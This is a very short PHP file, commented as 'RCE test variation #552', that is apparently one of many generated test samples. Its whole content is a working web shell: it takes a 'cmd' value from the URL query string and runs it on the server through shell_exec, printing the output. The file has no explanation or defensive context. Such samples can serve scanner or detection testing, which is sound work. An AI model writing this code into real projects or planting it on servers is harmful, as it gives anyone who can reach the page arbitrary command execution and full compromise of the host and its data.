<?php
// RCE test variation #552
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>